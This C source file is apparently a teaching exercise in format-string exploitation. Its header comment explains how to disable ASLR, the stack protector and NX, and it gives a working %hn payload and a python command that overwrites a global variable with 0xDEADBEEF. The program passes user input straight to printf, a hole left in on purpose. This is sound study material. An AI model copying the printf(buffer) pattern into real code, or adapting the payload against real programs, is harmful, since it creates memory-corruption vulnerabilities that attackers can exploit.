
/*
 * disable ASLR & compile:
 * $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  # disable ASLR
 * $ gcc -fno-stack-protector -z execstack -o format_string format_string.c -m32 -g  # compile with NX (DEP protection) disabled
 *
 * addresses to write:
 * val = 0x804a020 (addr)
 * val+2 = 0x804a022
 *
 * Original Addresses : \x08\x04\xa0\x20 -- \x08\x04\xa0\x22
 * Little Endian Addresses : \x20\xa0\x04\x08 -- \x22\xa0\x04\x08
 *
 * note:
 * %08x.%08x.%08x.%08x.%08x -> move internal pointer before format buffer
 *
 * PAYLOAD:
 *
 * 1) view data : AAAA-[%7\$p]
 * 2) write     : \x22\xa0\x04\x08\x20\xa0\x04\x08-[%56994p-%7\$hn]-[%57406p-%8\$hn]
 *
 * REMARKS:
 * 
 * by running the payload above as a input data from argument value, the `val` variable will be modified into 0xDEADBEEF
 *    $ ./format "$(python -c "import sys; sys.stdout.write('\x22\xa0\x04\x08\x20\xa0\x04\x08-[%56994p-%7\$hn]-[%57406p-%8\$hn]')")"
 *
 * REFERENCES:
 * 1) https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf
 * 2) http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
 *
 */

#include<stdio.h>

int val = 1;

int main(int argc, char** argv) {
    char buffer[100];
    strncpy(buffer, argv[1], 100);
    printf(buffer);
    printf("\nval : 0x%08X\n", val);
    return 0;
}